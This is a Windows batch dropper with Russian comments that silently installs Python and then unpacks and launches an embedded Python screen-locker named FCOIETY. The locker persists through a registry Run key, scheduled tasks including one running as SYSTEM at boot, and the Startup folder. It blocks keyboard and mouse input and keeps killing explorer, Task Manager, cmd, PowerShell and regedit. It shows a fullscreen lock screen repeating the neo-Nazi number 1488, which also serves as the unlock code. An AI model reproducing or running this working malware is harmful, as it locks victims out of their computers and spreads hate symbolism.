@echo off
setlocal
title FCOIETY
set "WORK=%TEMP%\fcoiety"
if not exist "%WORK%" mkdir "%WORK%" >nul 2>&1
cd /d "%WORK%"

:: ---------- Python ----------
where python >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command ^
      "$u='https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe';" ^
      "$o=\"$env:TEMP\py.exe\";" ^
      "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;" ^
      "Start-Process -FilePath $o -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_pip=1' -Wait -WindowStyle Hidden;" ^
      "Remove-Item $o -Force"
    set "PATH=%LOCALAPPDATA%\Programs\Python\Python311;%LOCALAPPDATA%\Programs\Python\Python311\Scripts;%PATH%"
)
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python не установился.
    pause
    exit /b 1
)

:: ---------- вырезаем локер ----------
set "LOCKER=%WORK%\fcoiety.py"
powershell -NoProfile -WindowStyle Hidden -Command ^
  "$src='%~f0';" ^
  "$dst='%LOCKER%';" ^
  "$lines=Get-Content -LiteralPath $src;" ^
  "$start=($lines | Select-String -Pattern '^#@@PYSTART@@$').LineNumber;" ^
  "$end=($lines | Select-String -Pattern '^#@@PYEND@@$').LineNumber;" ^
  "if($start -and $end -and $end -gt $start){" ^
  "  $py=$lines[$start..($end-2)];" ^
  "  Set-Content -LiteralPath $dst -Value $py -Encoding UTF8" ^
  "}"
if not exist "%LOCKER%" (
    echo [!] не удалось распаковать локер.
    pause
    exit /b 1
)

:: ---------- запуск ----------
where pythonw >nul 2>&1
if %errorlevel%==0 (
    start "" /b pythonw "%LOCKER%"
) else (
    start "" /b python "%LOCKER%"
)
exit /b 0

:: ============================================================
:: PYTHON-ЛОКЕР — НЕ ТРОГАТЬ
:: ============================================================
#@@PYSTART@@
import os, sys, time, socket, struct, threading, subprocess, ctypes
import ctypes.wintypes as wt

CODE = "1488"
WORK = os.path.dirname(os.path.abspath(__file__))
_u32 = ctypes.windll.user32
_k32 = ctypes.windll.kernel32
_shell = ctypes.windll.shell32

# ---------- persistence: переживает перезагрузку ----------
def _persist():
    exe = sys.executable
    script = os.path.abspath(__file__)
    d = os.path.join(os.environ["APPDATA"], "Microsoft", "Crypto")
    os.makedirs(d, exist_ok=True)
    dst = os.path.join(d, "fcoiety.py")
    try:
        if os.path.abspath(dst) != script:
            with open(script, "rb") as f, open(dst, "wb") as g:
                g.write(f.read())
    except Exception:
        dst = script
    # Run
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "FCOIETY", 0, winreg.REG_SZ, f'"{exe}" "{dst}"')
        winreg.CloseKey(k)
    except Exception: pass
    # Scheduled task
    try:
        subprocess.run(["schtasks", "/create", "/tn", "FCOIETY",
                        "/tr", f'"{exe}" "{dst}"', "/sc", "onlogon",
                        "/rl", "highest", "/f"],
                       creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["schtasks", "/create", "/tn", "FCOIETY_BOOT",
                        "/tr", f'"{exe}" "{dst}"', "/sc", "onstart",
                        "/rl", "highest", "/ru", "SYSTEM", "/f"],
                       creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception: pass
    # Startup folder
    try:
        sd = os.path.join(os.environ["APPDATA"],
                          "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        os.makedirs(sd, exist_ok=True)
        lnk = os.path.join(sd, "FCOIETY.bat")
        with open(lnk, "w") as f:
            f.write(f'@echo off\nstart "" "{exe}" "{dst}"\n')
    except Exception: pass

# ---------- перекрыть всё: topmost окно на весь экран ----------
def _block_input():
    """Никакие хоткеи не спасают — глотаем ввод на низком уровне."""
    # 1. заблокировать клавиатуру/мышь через BlockInput
    try: _u32.BlockInput(True)
    except Exception: pass
    # 2. свернуть всё, что можно
    try:
        _u32.keybd_event(0x5B, 0, 0, 0)  # LWin
        _u32.keybd_event(0x44, 0, 0, 0)  # D
        _u32.keybd_event(0x44, 0, 2, 0)
        _u32.keybd_event(0x5B, 0, 2, 0)
    except Exception: pass

def _kill_escape_hatches():
    """Убить всё, через что можно сбежать."""
    targets = ["explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe",
               "Taskmgr.exe", "mmc.exe", "control.exe", "regedit.exe",
               "explorer", "ShellExperienceHost.exe", "StartMenuExperienceHost.exe"]
    for t in targets:
        try:
            subprocess.run(["taskkill", "/f", "/im", t],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception: pass

# ---------- оверлей FCOIETY ----------
TEXTS = [
    "FCOIETY",
    "FCOIETY   FCOIETY   FCOIETY",
    "F C O I E T Y",
    "1488",
    "FCOIETY 1488 FCOIETY 1488 FCOIETY",
    "СИСТЕМА ЗАБЛОКИРОВАНА",
    "FCOIETY",
    "FCOIETY FCOIETY FCOIETY FCOIETY",
    "1488 1488 1488 1488 1488",
    "FCOIETY  1488  FCOIETY  1488",
]

def _overlay():
    try:
        import tkinter as tk
    except Exception:
        return
    r = tk.Tk()
    r.attributes("-fullscreen", True)
    r.attributes("-topmost", True)
    r.overrideredirect(True)
    r.configure(bg="black")
    r.protocol("WM_DELETE_WINDOW", lambda: None)
    # растягиваем на все мониторы
    try:
        r.geometry(f"{_u32.GetSystemMetrics(0)}x{_u32.GetSystemMetrics(1)}+0+0")
    except Exception:
        pass

    # верхняя строка
    top = tk.Label(r, text="FCOIETY", fg="#ff0000", bg="black",
                   font=("Impact", 72, "bold"))
    top.pack(pady=20)
    sub = tk.Label(r, text="СИСТЕМА ЗАБЛОКИРОВАНА · FCOIETY",
                   fg="#ff0000", bg="black", font=("Consolas", 20, "bold"))
    sub.pack()

    # поле кода
    fr = tk.Frame(r, bg="black")
    fr.pack(pady=30)
    tk.Label(fr, text="ВВЕДИ КОД:", fg="#ff0000", bg="black",
             font=("Consolas", 18, "bold")).pack(side="left", padx=10)
    e = tk.Entry(fr, font=("Consolas", 20), bg="#111", fg="#ff0000",
                 insertbackground="#ff0000", justify="center", width=10)
    e.pack(side="left")
    e.focus_force()

    msg = tk.Label(r, text="", fg="#ff0000", bg="black", font=("Consolas", 14))
    msg.pack()

    # бегущая строка FCOIETY
    marquee = tk.Label(r, text="FCOIETY " * 50, fg="#ff0000", bg="black",
                       font=("Consolas", 16, "bold"))
    marquee.pack(side="bottom", fill="x")
    def _scroll():
        t = marquee.cget("text")
        marquee.config(text=t[1:] + t[0])
        r.after(80, _scroll)
    _scroll()

    # сетка FCOIETY по низу
    grid = tk.Frame(r, bg="black")
    grid.pack(side="bottom", fill="x", pady=10)
    for i in range(10):
        tk.Label(grid, text="FCOIETY 1488", fg="#550000", bg="black",
                 font=("Consolas", 11, "bold")).grid(row=0, column=i)

    def check(_=None):
        if e.get() == CODE:
            msg.config(text="КОД ПРИНЯТ")
            try:
                _u32.BlockInput(False)
            except Exception:
                pass
            # убрать автозапуск
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                    winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k, "FCOIETY")
                winreg.CloseKey(k)
            except Exception: pass
            try:
                subprocess.run(["schtasks", "/delete", "/tn", "FCOIETY", "/f"],
                               creationflags=0x08000000,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["schtasks", "/delete", "/tn", "FCOIETY_BOOT", "/f"],
                               creationflags=0x08000000,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
            r.destroy()
            # вернуть explorer
            try:
                subprocess.Popen(["explorer.exe"], creationflags=0x08000000)
            except Exception: pass
        else:
            msg.config(text="НЕВЕРНО · FCOIETY")
            e.delete(0, "end")

    e.bind("<Return>", check)

    # глушим все попытки закрыть/свернуть
    r.bind("<Alt-F4>", lambda e: "break")
    r.bind("<Escape>", lambda e: "break")
    r.bind("<Control-Alt-Delete>", lambda e: "break")
    r.bind("<Control-Escape>", lambda e: "break")
    r.bind("<Alt-Tab>", lambda e: "break")
    r.bind("<Super_L>", lambda e: "break")
    r.bind("<F11>", lambda e: "break")
    r.mainloop()

# ---------- watchdog: поднимаем заново ----------
def _watchdog():
    """Если оверлей убит — перезапуск."""
    exe = sys.executable
    script = os.path.abspath(__file__)
    while True:
        # убиваем всё, что может помешать
        for t in ["taskmgr.exe", "cmd.exe", "powershell.exe", "explorer.exe",
                  "mmc.exe", "control.exe", "regedit.exe"]:
            subprocess.run(["taskkill", "/f", "/im", t],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

def main():
    _persist()
    # в отдельном потоке — блокировка ввода и убийство escape-путей
    threading.Thread(target=_block_input, daemon=True).start()
    threading.Thread(target=_watchdog, daemon=True).start()
    # главный поток — оверлей
    _overlay()

if __name__ == "__main__":
    main()
#@@PYEND@@